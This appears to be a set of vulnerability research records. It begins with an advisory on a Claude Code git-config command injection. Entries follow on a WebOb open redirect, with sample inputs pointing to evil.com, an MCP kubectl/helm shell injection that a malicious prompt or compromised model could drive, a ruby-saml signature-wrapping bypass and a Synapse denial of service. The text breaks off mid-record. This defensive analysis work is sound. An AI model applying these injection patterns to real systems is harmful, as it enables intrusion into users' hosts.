At startup, Claude Code constructed a shell command that interpolated the value of `git config user.email` from the current workspace. If an attacker controlled the repository’s Git config (e.g., via a malicious `.git/config`) and set `user.email` to a crafted payload, the unescaped interpolation could trigger arbitrary command execution **before** the user accepted the workspace-trust dialog. The issue affects versions prior to `1.0.105`. The fix in `1.0.105` avoids executing commands built from untrusted configuration and properly validates/escapes inputs.

* **Patches:** Update to `@anthropic-ai/claude-code` `1.0.105` or later.
* **Workarounds:** Open only trusted workspaces and inspect repository `.git/config` before launch; avoid inheriting untrusted Git configuration values.

> Thank you to the NVIDIA AI Red Team for reporting this issue!

round6_research.bug_semantics: Open redirect (CWE-601) in WebOb Location header normalization: Response._make_location_absolute (src/webob/response.py) validates the redirect target with SCHEME_RE and a leading-'//' escape, then joins it to the request URI via urlparse.urljoin. Since Python 3.10, urlsplit strips ASCII tab/CR/LF before parsing, so a target like '\thttps://evil.com' or '\t//evil.com' passes WebOb's checks (which run on the raw value) yet urljoin reinterprets it as an absolute/protocol-relative URL on an attacker-controlled host. round6_research.bug_semantics: CVE-2025-53355 / GHSA-gjv4-ghm7-q58q (CWE-77, CVSS 3.1 8.8 AV:N/AC:H/PR:N/UI:R, fixed 2.5.0): command injection in several kubectl/helm MCP tools. Tools build shell command strings by interpolating MCP tool input parameters (helm install/upgrade name/chart/repo/namespace, kubectl apply/create/delete/describe/get/logs/patch/rollout/scale/context params) and run them via child_process.execSync(command, ...), which executes through /bin/sh. An MCP client (e.g. a malicious prompt or compromised model) that controls tool arguments can inject shell metacharacters (; | & $ ` etc.) to run arbitrary commands on the host running the MCP server, which typically has full kubeconfig access. Fix ab165f5a migrates all 13 tool files from execSync(string) to execFileSync(binary, args[]) so arguments are passed verbatim, plus a related hardening in cyanheads/git-mcp-server (0dbd6995) for the same researcher-reported pattern (equixly.com blog 'MCP server new security nightmare').

round6_research.bug_semantics: SAML authentication bypass via XML Signature Wrapping (parser differential, incomplete fix of CVE-2025-25292). SignedDocument#validate_signature parsed self.to_s twice: a REXML @working_copy supplied SignedInfo/SignatureValue/DigestValue while the ID-referenced element was looked up and canonicalized via a separate Nokogiri.parse(self.to_s). REXML and Nokogiri disagree on XML details (entity/namespace/attribute handling), so an attacker can craft a document where the digest verifies over a benign referenced element but the consuming app (also Nokogiri-based) sees a different, attacker-controlled element - re-enabling signature wrapping. Fixed in v1.18.0 (commit e9c1cdbd) by adding XMLSecurity::BaseDocument.safe_load_xml (rejects DOCTYPE, strict Nokogiri options) and cache_referenced_xml, validating the reference against the single strict Nokogiri parse of the serialized doc, eliminating the dual-parser differential.
round6_research.evidence: Pickaxe git log -S 'Nokogiri.parse(self.to_s)' -- lib/xml_security.rb resolves to 5e7f13e1757217a2ed3a5e87bda46481eaf872a7 (2012-10-11 Stephen Touset); its diff adds 'document = Nokogiri.parse(self.to_s)' and 'hashed_element = document.at_xpath(...)' while keeping REXML::XPath reads for signature/digest. Parent 2d3d46c02d2523fa84cf6258a1938635fcfe721f contains zero Nokogiri references (grep count 0). validate_signature method name first appears in 77f1281cbda4674097fb82fd2f33a0163b6c06c5 (2014-02-20 Ben Radler, rename only, content already present in pre-image). Fix: OSV GHSA-9v8j-x534-2fx3 range introduced 0, fixed 1.18.0, reference commit e9c1cdbd0f9afa467b585de279db0cbd0fb8ae97; e9c1cdbd is contained in v1.18.0 (git describe v1.17.0-28-ge9c1cdb, merged via PR #750) and absent from v1.17.0. git show -s --format=%B scans: no AI markers (co-authored/assisted-by/anthropic/claude/copilot/codex/openai/grok) on either 5e7f13e or e9c1cdbd.
round6_research.flaw_origin: Human-authored pre-AI code. The dual-parser validation construct (REXML for signature elements + Nokogiri.parse for reference canonicalization) was introduced 2012-10-11 by Stephen Touset in 'Add support for canonicalization-algorithm detection' while porting XMLSecurity from the Onelogin Java sampler. The parser differential persisted through 13 years of maintenance and the CVE-2024-45409 fixes; CVE-2025-66567 is the incomplete-fix disclosure requiring the 1.18.0 rework.
round6_research.reasoning: The vulnerability is a 2012-era design flaw: mixing REXML and Nokogiri parses in signature validation. The minimum atomic introducer is 5e7f13e, which first coupled Nokogiri reference canonicalization with REXML signature reading; its parent lacks the construct entirely (introducer_parent_absent=true, no squash decomposition needed). The commit predates AI-assisted coding by years and carries no AI markers; the fix commit (e9c1cdbd, Mar 2025) is also marker-free human work by a Workato engineer. round6_research.bug_semantics: CPU starvation / denial of service in Synapse (Matrix homeserver): the WaitingLock/WorkerLocksHandler wait-loop first written in synapse/handlers/worker_lock.py doubles its retry timeout on every iteration via _get_next_retry_interval() (next = self._retry_interval; self._retry_interval = max(5, next*2)) with NO upper cap, and wraps the wait in 'except Exception: pass'. Under lock contention a local authenticated user can drive the interval to astronomically large values (doubling ~35 times reaches 10^10 seconds; per fix message an interval grew until its string conversion hit CPython's 4300-digit int_max_str_digits limit -> ValueError crash, failing/sterving other users' requests (CWE-400 / improper resource control).
round6_research.evidence: OSV GHSA-8q93-326v-3m7g / CVE-2026-45078: 'Local authenticated users can cause Synapse to starve other requests of CPU and lead to other requests failing...
